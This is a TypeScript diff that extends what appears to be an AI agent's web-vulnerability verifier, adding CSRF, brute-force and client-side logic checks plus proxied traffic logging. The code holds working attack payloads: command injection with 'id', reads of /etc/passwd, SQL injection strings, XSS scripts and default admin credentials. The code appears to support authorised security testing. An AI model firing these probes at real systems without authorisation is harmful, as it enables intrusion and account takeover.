@@ -9,15 +9,20 @@ type VerifyResult = {
   confirmed: boolean;
   reason: string;
   evidence_id?: string;
+  baseline_traffic_id?: string;
+  attack_traffic_id?: string;
+  traffic_ids?: string[];
   requests: Array<{ method: string; url: string; status: number; marker?: string }>;
   details?: Record<string, unknown>;
 };
+
+type HttpProbe = { method: string; url: string; status: number; headers: Record<string, string>; body: string; requestHeaders: Record<string, string>; requestBody?: string };
 
 export function createVerifierTool(runtime: ToolRuntime): ToolDefinition<any> {
   return {
     name: "verifier",
     label: "Verifier",
-    description: "Run deterministic verification helpers for common web vulnerability classes. Supported classes: command-injection, file-inclusion, sql-injection, xss-reflected, xss-stored, blind-sql-injection, weak-session-id, file-upload.",
+    description: "Run deterministic verification helpers for common web vulnerability classes. Supported classes: command-injection, file-inclusion, sql-injection, xss-reflected, xss-stored, blind-sql-injection, weak-session-id, file-upload, csrf, brute-force, javascript-logic.",
     promptSnippet: "Run a deterministic vulnerability verifier",
     promptGuidelines: [
       "Use verifier after discovering a plausible endpoint/parameter to avoid ad hoc incomplete checks.",
@@ -33,10 +38,29 @@ export function createVerifierTool(runtime: ToolRuntime): ToolDefinition<any> {
       payload: Type.Optional(Type.String()),
       true_payload: Type.Optional(Type.String()),
       false_payload: Type.Optional(Type.String()),
+      baseline_payload: Type.Optional(Type.String()),
       samples: Type.Optional(Type.Number()),
       file_field: Type.Optional(Type.String()),
       filename: Type.Optional(Type.String()),
       file_content: Type.Optional(Type.String()),
+      retrieve_url: Type.Optional(Type.String()),
+      retrieve_candidates: Type.Optional(Type.Array(Type.String())),
+      baseline_url: Type.Optional(Type.String()),
+      check_url: Type.Optional(Type.String()),
+      token_param: Type.Optional(Type.String()),
+      token_value: Type.Optional(Type.String()),
+      stale_token: Type.Optional(Type.String()),
+      username_param: Type.Optional(Type.String()),
+      password_param: Type.Optional(Type.String()),
+      username: Type.Optional(Type.String()),
+      password: Type.Optional(Type.String()),
+      valid_username: Type.Optional(Type.String()),
+      valid_password: Type.Optional(Type.String()),
+      invalid_username: Type.Optional(Type.String()),
+      invalid_password: Type.Optional(Type.String()),
+      success_pattern: Type.Optional(Type.String()),
+      failure_pattern: Type.Optional(Type.String()),
+      expected_value: Type.Optional(Type.String()),
       fields: Type.Optional(Type.Record(Type.String(), Type.String())),
     }),
     async execute(_toolCallId: string, params: any) {
@@ -44,7 +68,11 @@ export function createVerifierTool(runtime: ToolRuntime): ToolDefinition<any> {
       if (!isInScope(runtime, url)) throw new Error(`out of scope: ${url}`);
       const vulnClass = String(params.vuln_class || "").toLowerCase();
       const headers = params.headers || {};
-      const result = await runVerifier(vulnClass, url, params, headers);
+      const result = await runVerifier(vulnClass, url, params, headers, runtime.trafficProxyUrl);
+      const trafficIds = persistVerifierTraffic(runtime, result);
+      result.traffic_ids = trafficIds;
+      result.baseline_traffic_id = trafficIds[0];
+      result.attack_traffic_id = trafficIds[1] || trafficIds[0];
       const evidenceId = await emitToolEvidence(runtime, "verifier", `${vulnClass} ${url} -> ${result.confirmed ? "confirmed" : "not confirmed"}`, result);
       result.evidence_id = evidenceId;
       await observeAttackSurface(runtime, {
@@ -60,15 +88,18 @@ export function createVerifierTool(runtime: ToolRuntime): ToolDefinition<any> {
   };
 }
 
-async function runVerifier(vulnClass: string, url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
-  if (vulnClass === "command-injection") return verifyCommandInjection(url, params, headers);
-  if (vulnClass === "file-inclusion") return verifyFileInclusion(url, params, headers);
-  if (vulnClass === "sql-injection") return verifySqlInjection(url, params, headers);
-  if (vulnClass === "xss-reflected") return verifyReflectedXss(url, params, headers);
-  if (vulnClass === "xss-stored") return verifyStoredXss(url, params, headers);
-  if (vulnClass === "blind-sql-injection") return verifyBlindSql(url, params, headers);
-  if (vulnClass === "weak-session-id") return verifyWeakSessionId(url, params, headers);
-  if (vulnClass === "file-upload") return verifyFileUpload(url, params, headers);
+async function runVerifier(vulnClass: string, url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
+  if (vulnClass === "command-injection") return verifyCommandInjection(url, params, headers, proxyUrl);
+  if (vulnClass === "file-inclusion") return verifyFileInclusion(url, params, headers, proxyUrl);
+  if (vulnClass === "sql-injection") return verifySqlInjection(url, params, headers, proxyUrl);
+  if (vulnClass === "xss-reflected") return verifyReflectedXss(url, params, headers, proxyUrl);
+  if (vulnClass === "xss-stored") return verifyStoredXss(url, params, headers, proxyUrl);
+  if (vulnClass === "blind-sql-injection") return verifyBlindSql(url, params, headers, proxyUrl);
+  if (vulnClass === "weak-session-id") return verifyWeakSessionId(url, params, headers, proxyUrl);
+  if (vulnClass === "file-upload") return verifyFileUpload(url, params, headers, proxyUrl);
+  if (vulnClass === "csrf") return verifyCsrf(url, params, headers, proxyUrl);
+  if (vulnClass === "brute-force") return verifyBruteForce(url, params, headers, proxyUrl);
+  if (vulnClass === "javascript-logic") return verifyJavascriptLogic(url, params, headers, proxyUrl);
   return {
     confirmed: false,
     reason: `unsupported verifier class: ${vulnClass}`,
@@ -76,12 +107,12 @@ async function runVerifier(vulnClass: string, url: string, params: any, headers:
   };
 }
 
-async function verifyCommandInjection(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
+async function verifyCommandInjection(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
   const param = params.param || "ip";
   const payload = params.payload || "127.0.0.1;id";
   const baselinePayload = params.baseline_payload || "127.0.0.1";
-  const baseline = await requestWithParam(url, params.method || "POST", param, baselinePayload, headers);
-  const response = await requestWithParam(url, params.method || "POST", param, payload, headers);
+  const baseline = await requestWithParam(url, params.method || "POST", param, baselinePayload, headers, proxyUrl);
+  const response = await requestWithParam(url, params.method || "POST", param, payload, headers, proxyUrl);
   const marker = /\buid=\d+\([^)]*\)|\bgid=\d+\([^)]*\)|www-data|root/.exec(response.body)?.[0];
   const baselineHasMarker = /\buid=\d+\(|\bgid=\d+\(|www-data|root/.test(baseline.body);
   const confirmed = Boolean(marker) && !baselineHasMarker;
@@ -100,16 +131,17 @@ async function verifyCommandInjection(url: string, params: any, headers: Record<
       injected_length: response.body.length,
       marker,
       response_excerpt: marker ? excerptAround(response.body, marker) : response.body.slice(0, 500),
+      probes: [probeDetails(baseline, "baseline"), probeDetails(response, "attack")],
     },
   };
 }
 
-async function verifyFileInclusion(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
+async function verifyFileInclusion(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
   const param = params.param || "page";
   const payload = params.payload || "/etc/passwd";
   const baselinePayload = params.baseline_payload || "include.php";
-  const baseline = await requestWithParam(url, "GET", param, baselinePayload, headers);
-  const response = await requestWithParam(url, "GET", param, payload, headers);
+  const baseline = await requestWithParam(url, "GET", param, baselinePayload, headers, proxyUrl);
+  const response = await requestWithParam(url, "GET", param, payload, headers, proxyUrl);
   const marker = /root:x:0:0:[^\n<]*|www-data:x:[^\n<]*/i.exec(response.body)?.[0];
   const confirmed = Boolean(marker) && !baseline.body.includes(marker || "\u0000");
   return {
@@ -127,16 +159,17 @@ async function verifyFileInclusion(url: string, params: any, headers: Record<str
       injected_length: response.body.length,
       marker,
       response_excerpt: marker ? excerptAround(response.body, marker) : response.body.slice(0, 500),
+      probes: [probeDetails(baseline, "baseline"), probeDetails(response, "attack")],
     },
   };
 }
 
-async function verifySqlInjection(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
+async function verifySqlInjection(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
   const param = params.param || "id";
   const baselinePayload = params.baseline_payload || "1";
   const payload = params.payload || "1' OR '1'='1";
-  const baseline = await requestWithParam(url, params.method || "GET", param, baselinePayload, headers);
-  const response = await requestWithParam(url, params.method || "GET", param, payload, headers);
+  const baseline = await requestWithParam(url, params.method || "GET", param, baselinePayload, headers, proxyUrl);
+  const response = await requestWithParam(url, params.method || "GET", param, payload, headers, proxyUrl);
   const marker = /First name:|Surname:|SQL syntax|You have an error|MariaDB|MySQL|admin/i.exec(response.body)?.[0];
   const confirmed = Boolean(marker) && meaningfulDifference(baseline.body, response.body);
   return {
@@ -154,16 +187,17 @@ async function verifySqlInjection(url: string, params: any, headers: Record<stri
       injected_length: response.body.length,
       marker,
       response_excerpt: marker ? excerptAround(response.body, marker) : response.body.slice(0, 500),
+      probes: [probeDetails(baseline, "baseline"), probeDetails(response, "attack")],
     },
   };
 }
 
-async function verifyReflectedXss(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
+async function verifyReflectedXss(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
   const param = params.param || "name";
   const payload = params.payload || "<script>alert(1)</script>";
   const baselinePayload = params.baseline_payload || "node2-baseline";
-  const baseline = await requestWithParam(url, params.method || "GET", param, baselinePayload, headers);
-  const response = await requestWithParam(url, params.method || "GET", param, payload, headers);
+  const baseline = await requestWithParam(url, params.method || "GET", param, baselinePayload, headers, proxyUrl);
+  const response = await requestWithParam(url, params.method || "GET", param, payload, headers, proxyUrl);
   const reflected = response.body.includes(payload);
   const baselineReflected = baseline.body.includes(payload);
   const executableContext = reflected && /<pre>\s*Hello\s*<script>alert\(1\)<\/script>|<script>alert\(1\)<\/script>/i.test(response.body);
@@ -183,11 +217,12 @@ async function verifyReflectedXss(url: string, params: any, headers: Record<stri
       injected_length: response.body.length,
       executable_context: executableContext,
       response_excerpt: reflected ? excerptAround(response.body, payload) : response.body.slice(0, 500),
+      probes: [probeDetails(baseline, "baseline"), probeDetails(response, "attack")],
     },
   };
 }
 
-async function verifyStoredXss(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
+async function verifyStoredXss(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
   const payload = params.payload || "<svg/onload=alert(1)>";
   const fields = { ...(params.fields || {}) };
   if (!Object.keys(fields).length) {
@@ -195,8 +230,12 @@ async function verifyStoredXss(url: string, params: any, headers: Record<string,
     fields.mtxMessage = payload;
     fields.btnSign = "Sign Guestbook";
   }
-  const post = await sendHttp({ method: "POST", url, headers: { "content-type": "application/x-www-form-urlencoded", ...headers }, body: new URLSearchParams(fields).toString() });
-  const get = await sendHttp({ method: "GET", url, headers });
+  const postHeaders = { "content-type": "application/x-www-form-urlencoded", ...headers };
+  const postBody = new URLSearchParams(fields).toString();
+  const postResponse = await sendHttp({ method: "POST", url, headers: postHeaders, body: postBody, proxyUrl });
+  const getResponse = await sendHttp({ method: "GET", url, headers, proxyUrl });
+  const post: HttpProbe = { method: "POST", url, status: postResponse.status, headers: postResponse.headers, body: postResponse.body, requestHeaders: postHeaders, requestBody: postBody };
+  const get: HttpProbe = { method: "GET", url, status: getResponse.status, headers: getResponse.headers, body: getResponse.body, requestHeaders: headers };
   const confirmed = get.body.includes(payload);
   return {
     confirmed,
@@ -211,16 +250,17 @@ async function verifyStoredXss(url: string, params: any, headers: Record<string,
       post_length: post.body.length,
       get_length: get.body.length,
       response_excerpt: confirmed ? excerptAround(get.body, payload) : get.body.slice(0, 500),
+      probes: [probeDetails(post, "attack"), probeDetails(get, "baseline")],
     },
   };
 }
 
-async function verifyBlindSql(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
+async function verifyBlindSql(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
   const param = params.param || "id";
   const truePayload = params.true_payload || "1 AND 1=1";
   const falsePayload = params.false_payload || "1 AND 1=2";
-  const trueResponse = await requestWithParam(url, "GET", param, truePayload, headers);
-  const falseResponse = await requestWithParam(url, "GET", param, falsePayload, headers);
+  const trueResponse = await requestWithParam(url, "GET", param, truePayload, headers, proxyUrl);
+  const falseResponse = await requestWithParam(url, "GET", param, falsePayload, headers, proxyUrl);
   const confirmed = meaningfulDifference(trueResponse.body, falseResponse.body) || trueResponse.status !== falseResponse.status;
   const trueMarker = /User ID exists|First name:|Surname:|exists/i.exec(trueResponse.body)?.[0];
   const falseMarker = /User ID is MISSING|missing|does not exist/i.exec(falseResponse.body)?.[0];
@@ -241,16 +281,17 @@ async function verifyBlindSql(url: string, params: any, headers: Record<string, 
       false_marker: falseMarker,
       true_excerpt: trueMarker ? excerptAround(trueResponse.body, trueMarker) : trueResponse.body.slice(0, 300),
       false_excerpt: falseMarker ? excerptAround(falseResponse.body, falseMarker) : falseResponse.body.slice(0, 300),
+      probes: [probeDetails(trueResponse, "true"), probeDetails(falseResponse, "false")],
     },
   };
 }
 
-async function verifyWeakSessionId(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
+async function verifyWeakSessionId(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
   const samples = Math.max(3, Math.min(Number(params.samples || 5), 20));
   const values: string[] = [];
   const requests: VerifyResult["requests"] = [];
   for (let i = 0; i < samples; i += 1) {
-    const response = await sendHttp({ method: "GET", url, headers });
+    const response = await sendHttp({ method: "GET", url, headers, proxyUrl });
     requests.push({ method: "GET", url, status: response.status });
     const cookie = response.headers["set-cookie"] || "";
     const match = /(?:^|,\s*)([^=;,]+)=([^;,]+)/.exec(cookie);
@@ -265,29 +306,205 @@ async function verifyWeakSessionId(url: string, params: any, headers: Record<str
   };
 }
 
-async function verifyFileUpload(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
+async function verifyFileUpload(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
   const boundary = `----node2-${Date.now().toString(16)}`;
   const fileField = params.file_field || "uploaded";
   const filename = params.filename || "node2-proof.txt";
   const fileContent = params.file_content || "NODE2_UPLOAD_PROOF";
   const fields = { ...(params.fields || {}), btnUpload: params.fields?.btnUpload || "Upload" };
   const body = multipartBody(boundary, fields, fileField, filename, fileContent);
-  const response = await sendHttp({ method: "POST", url, headers: { ...headers, "content-type": `multipart/form-data; boundary=${boundary}` }, body });
-  const confirmed = response.body.includes(filename) || response.body.includes("uploaded") || response.body.includes("succesfully");
-  return result(confirmed, confirmed ? "upload response indicates file was accepted" : "upload response did not indicate success", { method: "POST", url, status: response.status, body: response.body }, filename);
+  const requestHeaders = { ...headers, "content-type": `multipart/form-data; boundary=${boundary}` };
+  const uploadResponse = await sendHttp({ method: "POST", url, headers: requestHeaders, body, proxyUrl });
+  const uploadProbe: HttpProbe = {
+    method: "POST",
+    url,
+    status: uploadResponse.status,
+    headers: uploadResponse.headers,
+    body: uploadResponse.body,
+    requestHeaders,
+    requestBody: body,
+  };
+  const accepted = uploadResponse.body.includes(filename) || /upload(?:ed)?|success|succesfully/i.test(uploadResponse.body);
+  const candidates = uploadRetrievalCandidates(url, uploadResponse.body, filename, params);
+  const retrievals: HttpProbe[] = [];
+  let retrieved: HttpProbe | undefined;
+  for (const candidate of candidates) {
+    const response = await sendHttp({ method: "GET", url: candidate, headers, proxyUrl });
+    const probe: HttpProbe = {
+      method: "GET",
+      url: candidate,
+      status: response.status,
+      headers: response.headers,
+      body: response.body,
+      requestHeaders: headers,
+    };
+    retrievals.push(probe);
+    if (response.body.includes(fileContent)) {
+      retrieved = probe;
+      break;
+    }
+  }
+  const confirmed = Boolean(retrieved);
+  return {
+    confirmed,
+    reason: confirmed
+      ? "uploaded file marker was retrieved from a web-accessible URL"
+      : accepted
+        ? "upload appeared accepted, but uploaded marker was not retrievable"
+        : "upload response did not indicate success",
+    requests: [
+      { method: "POST", url, status: uploadProbe.status, marker: accepted ? filename : undefined },
+      ...retrievals.map((probe) => ({ method: "GET", url: probe.url, status: probe.status, marker: probe === retrieved ? fileContent : undefined })),
+    ],
+    details: {
+      file_field: fileField,
+      filename,
+      marker: fileContent,
+      accepted,
+      retrieval_candidates: candidates,
+      response_excerpt: accepted ? excerptAround(uploadResponse.body, filename) : uploadResponse.body.slice(0, 500),
+      retrieved_url: retrieved?.url,
+      probes: [probeDetails(uploadProbe, "attack"), ...retrievals.map((probe, index) => probeDetails(probe, index === retrievals.indexOf(retrieved as HttpProbe) ? "retrieval" : "probe"))],
+    },
+  };
 }
 
-async function requestWithParam(url: string, method: string, param: string, payload: string, headers: Record<string, string>): Promise<{ method: string; url: string; status: number; body: string }> {
+async function verifyCsrf(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
+  const method = (params.method || "POST").toUpperCase();
+  const checkUrl = params.check_url ? resolveSiblingUrl(url, params.check_url) : params.baseline_url ? resolveSiblingUrl(url, params.baseline_url) : url;
+  const tokenParam = params.token_param || firstTokenField(params.fields || {}) || "csrf_token";
+  const successPattern = optionalRegexFrom(params.success_pattern);
+  const failurePattern = regexFrom(params.failure_pattern || "\\bcsrf\\b|forbidden|invalid|denied|bad token|invalid token|missing token");
+  const baseline = await sendProbe("GET", checkUrl, headers, undefined, proxyUrl);
+  const attackFields = { ...(params.fields || {}) };
+  if (params.stale_token) attackFields[tokenParam] = String(params.stale_token);
+  else delete attackFields[tokenParam];
+  const attack = await requestWithFields(url, method, attackFields, headers, proxyUrl);
+  const after = await sendProbe("GET", checkUrl, headers, undefined, proxyUrl);
+  const attackSuccess = successPattern ? successPattern.test(attack.body) : !failurePattern.test(attack.body) && attack.status < 400;
+  const stateChanged = meaningfulDifference(baseline.body, after.body) || submittedValueAppeared(baseline.body, after.body, attackFields);
+  const confirmed = attackSuccess && (stateChanged || Boolean(successPattern?.test(attack.body)));
+  const probes = after ? [baseline, attack, after] : [baseline, attack];
+  return {
+    confirmed,
+    reason: confirmed
+      ? "state-changing request succeeded without a valid CSRF token"
+      : "missing/stale-token request did not prove a state change",
+    requests: probes.map((probe, index) => ({
+      method: probe.method,
+      url: probe.url,
+      status: probe.status,
+      marker: index === 0 ? "baseline" : index === 1 ? "attack" : "after",
+    })),
+    details: {
+      token_param: tokenParam,
+      omitted_or_stale_token: !Object.prototype.hasOwnProperty.call(attackFields, tokenParam) ? "omitted" : "stale",
+      success_pattern: params.success_pattern,
+      failure_pattern: params.failure_pattern,
+      baseline_length: baseline.body.length,
+      attack_length: attack.body.length,
+      after_length: after?.body.length,
+      state_changed: stateChanged,
+      attack_success: attackSuccess,
+      response_excerpt: attack.body.slice(0, 500),
+      probes: probes.map((probe, index) => probeDetails(probe, index === 0 ? "baseline" : index === 1 ? "attack" : "after")),
+    },
+  };
+}
+
+async function verifyBruteForce(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
+  const method = (params.method || "POST").toUpperCase();
+  const usernameParam = params.username_param || "username";
+  const passwordParam = params.password_param || "password";
+  const username = params.valid_username || params.username || "admin";
+  const validPassword = params.valid_password || params.password || "password";
+  const invalidUsername = params.invalid_username || username;
+  const invalidPassword = params.invalid_password || "node2-invalid-password";
+  const successPattern = regexFrom(params.success_pattern || params.login_success_pattern || "welcome|logout|dashboard|password protected|success");
+  const failurePattern = regexFrom(params.failure_pattern || "incorrect|invalid|failed|denied|wrong|try again");
+  const baseFields = { ...(params.fields || {}) };
+  const invalid = await requestLoginAttempt(url, method, baseFields, usernameParam, passwordParam, invalidUsername, invalidPassword, params, headers, proxyUrl);
+  const valid = await requestLoginAttempt(url, method, baseFields, usernameParam, passwordParam, username, validPassword, params, headers, proxyUrl);
+  const invalidHasSuccess = successPattern.test(invalid.body);
+  const invalidFailed = failurePattern.test(invalid.body) || !invalidHasSuccess;
+  const validSucceeded = successPattern.test(valid.body) && !invalidHasSuccess;
+  const confirmed = invalidFailed && validSucceeded;
+  return {
+    confirmed,
+    reason: confirmed
+      ? "controlled invalid and known/default valid credential attempts produced a login success differential"
+      : "credential attempts did not prove a valid weak/default credential",
+    requests: [
+      { method: invalid.method, url: invalid.url, status: invalid.status, marker: "invalid-credential" },
+      { method: valid.method, url: valid.url, status: valid.status, marker: validSucceeded ? "valid-credential-success" : undefined },
+    ],
+    details: {
+      username_param: usernameParam,
+      password_param: passwordParam,
+      username,
+      invalid_username: invalidUsername,
+      invalid_failed: invalidFailed,
+      valid_succeeded: validSucceeded,
+      success_pattern: params.success_pattern,
+      failure_pattern: params.failure_pattern,
+      invalid_length: invalid.body.length,
+      valid_length: valid.body.length,
+      valid_excerpt: valid.body.slice(0, 500),
+      invalid_excerpt: invalid.body.slice(0, 500),
+      probes: [probeDetails(invalid, "baseline"), probeDetails(valid, "attack")],
+    },
+  };
+}
+
+async function verifyJavascriptLogic(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
+  const method = (params.method || "POST").toUpperCase();
+  const param = params.param || params.token_param || "token";
+  const expected = params.expected_value || params.payload;
+  const successPattern = regexFrom(params.success_pattern || "success|accepted|correct|valid");
+  const failurePattern = regexFrom(params.failure_pattern || "invalid|incorrect|failed|denied|wrong");
+  const page = await sendProbe("GET", params.baseline_url ? resolveSiblingUrl(url, params.baseline_url) : url, headers, undefined, proxyUrl);
+  const falseFields = { ...(params.fields || {}), [param]: params.false_payload || "node2-invalid-client-value" };
+  const trueFields = { ...(params.fields || {}) };
+  if (expected) trueFields[param] = String(expected);
+  const baseline = await requestWithFields(url, method, falseFields, headers, proxyUrl);
+  const attack = await requestWithFields(url, method, trueFields, headers, proxyUrl);
+  const confirmed = successPattern.test(attack.body) && (failurePattern.test(baseline.body) || meaningfulDifference(baseline.body, attack.body));
+  return {
+    confirmed,
+    reason: confirmed
+      ? "server accepted a client-derived or client-side-only value that failed under a controlled invalid value"
+      : "client-side logic bypass or derived value was not proven",
+    requests: [
+      { method: page.method, url: page.url, status: page.status, marker: "baseline" },
+      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "invalid-client-value" },
+      { method: attack.method, url: attack.url, status: attack.status, marker: confirmed ? "accepted-client-derived-value" : undefined },
+    ],
+    details: {
+      param,
+      expected_value_supplied: Boolean(expected),
+      success_pattern: params.success_pattern,
+      failure_pattern: params.failure_pattern,
+      page_contains_script: /<script\b|\.js\b|function\s+\w+\s*\(/i.test(page.body),
+      invalid_length: baseline.body.length,
+      attack_length: attack.body.length,
+      attack_excerpt: attack.body.slice(0, 500),
+      probes: [probeDetails(page, "baseline"), probeDetails(baseline, "false"), probeDetails(attack, "attack")],
+    },
+  };
+}
+
+async function requestWithParam(url: string, method: string, param: string, payload: string, headers: Record<string, string>, proxyUrl?: string): Promise<HttpProbe> {
   if (method.toUpperCase() === "POST") {
     const body = new URLSearchParams({ [param]: payload, Submit: "Submit" }).toString();
-    const response = await sendHttp({ method: "POST", url, headers: { "content-type": "application/x-www-form-urlencoded", ...headers }, body });
-    return { method: "POST", url, status: response.status, body: response.body };
+    const requestHeaders = { "content-type": "application/x-www-form-urlencoded", ...headers };
+    const response = await sendHttp({ method: "POST", url, headers: requestHeaders, body, proxyUrl });
+    return { method: "POST", url, status: response.status, headers: response.headers, body: response.body, requestHeaders, requestBody: body };
   }
   const target = new URL(url);
   target.searchParams.set(param, payload);
   if (!target.searchParams.has("Submit")) target.searchParams.set("Submit", "Submit");
-  const response = await sendHttp({ method: "GET", url: target.toString(), headers });
-  return { method: "GET", url: target.toString(), status: response.status, body: response.body };
+  const response = await sendHttp({ method: "GET", url: target.toString(), headers, proxyUrl });
+  return { method: "GET", url: target.toString(), status: response.status, headers: response.headers, body: response.body, requestHeaders: headers };
 }
 
 function result(confirmed: boolean, reason: string, response: { method: string; url: string; status: number; body: string }, marker?: string): VerifyResult {
@@ -297,6 +514,52 @@ function result(confirmed: boolean, reason: string, response: { method: string; 
     requests: [{ method: response.method, url: response.url, status: response.status, marker }],
     details: { response_length: response.body.length },
   };
+}
+
+async function sendProbe(method: string, url: string, headers: Record<string, string>, body?: string, proxyUrl?: string): Promise<HttpProbe> {
+  const response = await sendHttp({ method, url, headers, body, proxyUrl });
+  return { method, url, status: response.status, headers: response.headers, body: response.body, requestHeaders: headers, requestBody: body };
+}
+
+async function requestWithFields(
+  url: string,
+  method: string,
+  fields: Record<string, string>,
+  headers: Record<string, string>,
+  proxyUrl?: string,
+): Promise<HttpProbe> {
+  if (method.toUpperCase() === "GET") {
+    const target = new URL(url);
+    for (const [key, value] of Object.entries(fields)) target.searchParams.set(key, value);
+    const response = await sendHttp({ method: "GET", url: target.toString(), headers, proxyUrl });
+    return { method: "GET", url: target.toString(), status: response.status, headers: response.headers, body: response.body, requestHeaders: headers };
+  }
+  const body = new URLSearchParams(fields).toString();
+  const requestHeaders = { "content-type": "application/x-www-form-urlencoded", ...headers };
+  const response = await sendHttp({ method: "POST", url, headers: requestHeaders, body, proxyUrl });
+  return { method: "POST", url, status: response.status, headers: response.headers, body: response.body, requestHeaders, requestBody: body };
+}
+
+async function requestLoginAttempt(
+  url: string,
+  method: string,
+  fields: Record<string, string>,
+  usernameParam: string,
+  passwordParam: string,
+  username: string,
+  password: string,
+  params: any,
+  headers: Record<string, string>,
+  proxyUrl?: string,
+): Promise<HttpProbe> {
+  const attemptFields = { ...fields, [usernameParam]: username, [passwordParam]: password };
+  const tokenParam = params.token_param;
+  if (tokenParam) {
+    const tokenPage = await sendProbe("GET", params.token_url ? resolveSiblingUrl(url, params.token_url) : url, headers, undefined, proxyUrl);
+    const token = extractToken(tokenPage.body, tokenParam);
+    if (token) attemptFields[tokenParam] = token;
+  }
+  return requestWithFields(url, method, attemptFields, headers, proxyUrl);
 }
 
 async function markVerified(runtime: ToolRuntime, rawUrl: string, param: string, vulnClass: string, result: VerifyResult, evidenceId: string): Promise<void> {
@@ -336,7 +599,78 @@ function defaultParam(vulnClass: string): string {
   if (vulnClass === "blind-sql-injection") return "id";
   if (vulnClass === "file-upload") return "uploaded";
   if (vulnClass === "weak-session-id") return "session";
+  if (vulnClass === "csrf") return "csrf_token";
+  if (vulnClass === "brute-force") return "username,password";
+  if (vulnClass === "javascript-logic") return "token";
   return "-";
+}
+
+function regexFrom(value: unknown): RegExp {
+  if (!value || typeof value !== "string") return /$a/;
+  return new RegExp(value, "i");
+}
+
+function optionalRegexFrom(value: unknown): RegExp | undefined {
+  if (!value || typeof value !== "string") return undefined;
+  return new RegExp(value, "i");
+}
+
+function firstTokenField(fields: Record<string, string>): string | undefined {
+  return Object.keys(fields).find((key) => /csrf|token|nonce/i.test(key));
+}
+
+function submittedValueAppeared(before: string, after: string, fields: Record<string, string>): boolean {
+  return Object.entries(fields).some(([key, value]) =>
+    !/csrf|token|nonce/i.test(key) &&
+    value.length > 0 &&
+    !before.includes(value) &&
+    after.includes(value)
+  );
+}
+
+function extractToken(html: string, name: string): string | undefined {
+  const escaped = name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+  const patterns = [
+    new RegExp(`name=["']${escaped}["'][^>]*value=["']([^"']+)["']`, "i"),
+    new RegExp(`value=["']([^"']+)["'][^>]*name=["']${escaped}["']`, "i"),
+  ];
+  for (const pattern of patterns) {
+    const match = pattern.exec(html);
+    if (match?.[1]) return match[1];
+  }
+  return undefined;
+}
+
+function resolveSiblingUrl(base: string, value: string): string {
+  return new URL(value, base).toString();
+}
+
+function uploadRetrievalCandidates(baseUrl: string, responseBody: string, filename: string, params: any): string[] {
+  const raw = new Set<string>();
+  if (typeof params.retrieve_url === "string") raw.add(params.retrieve_url);
+  for (const item of Array.isArray(params.retrieve_candidates) ? params.retrieve_candidates : []) {
+    if (typeof item === "string") raw.add(item);
+  }
+  const escapedFilename = filename.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+  const attr = /\b(?:href|src)=["']([^"']+)["']/gi;
+  for (let match = attr.exec(responseBody); match; match = attr.exec(responseBody)) {
+    if (match[1]?.includes(filename)) raw.add(match[1]);
+  }
+  const pathPattern = new RegExp(`(?:https?://[^\\s"'<>]+|(?:\\.\\./|\\./|/)?[^\\s"'<>]*${escapedFilename})`, "gi");
+  for (let match = pathPattern.exec(responseBody); match; match = pathPattern.exec(responseBody)) {
+    if (match[0]) raw.add(match[0]);
+  }
+  raw.add(filename);
+  const out: string[] = [];
+  for (const candidate of raw) {
+    try {
+      const resolved = new URL(candidate, baseUrl).toString();
+      if (!out.includes(resolved)) out.push(resolved);
+    } catch {
+      // Ignore malformed server-provided paths.
+    }
+  }
+  return out.slice(0, 8);
 }
 
 function meaningfulDifference(left: string, right: string): boolean {
@@ -374,4 +708,47 @@ function multipartBody(boundary: string, fields: Record<string, string>, fileFie
 
 function slug(value: string): string {
   return value.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/(^-|-$)/g, "").slice(0, 100) || "item";
+}
+
+function persistVerifierTraffic(runtime: ToolRuntime, result: VerifyResult): string[] {
+  const probes = Array.isArray(result.details?.probes) ? result.details.probes : [];
+  const ids: string[] = [];
+  for (const probe of probes) {
+    if (!probe || typeof probe !== "object") continue;
+    const row = probe as Record<string, unknown>;
+    const method = typeof row.method === "string" ? row.method : "GET";
+    const url = typeof row.url === "string" ? row.url : "";
+    if (!url) continue;
+    ids.push(runtime.traffic.add({
+      source: `verifier.${String(row.role || "probe")}`,
+      method,
+      url,
+      status: typeof row.status === "number" ? row.status : undefined,
+      requestHeaders: recordOfString(row.requestHeaders),
+      requestBody: typeof row.requestBody === "string" ? row.requestBody : undefined,
+      responseHeaders: recordOfString(row.responseHeaders),
+      responseBody: typeof row.responseBody === "string" ? row.responseBody : undefined,
+    }));
+  }
+  return ids;
+}
+
+function probeDetails(probe: HttpProbe, role: string): Record<string, unknown> {
+  return {
+    role,
+    method: probe.method,
+    url: probe.url,
+    status: probe.status,
+    requestHeaders: probe.requestHeaders,
+    requestBody: probe.requestBody,
+    responseHeaders: probe.headers,
+    responseBody: probe.body,
+  };
+}
+
+function recordOfString(value: unknown): Record<string, string> {
+  if (!value || typeof value !== "object" || Array.isArray(value)) return {};
+  const out: Record<string, string> = {};
+  for (const [key, item] of Object.entries(value)) out[key] = String(item);
+  return out;
 }
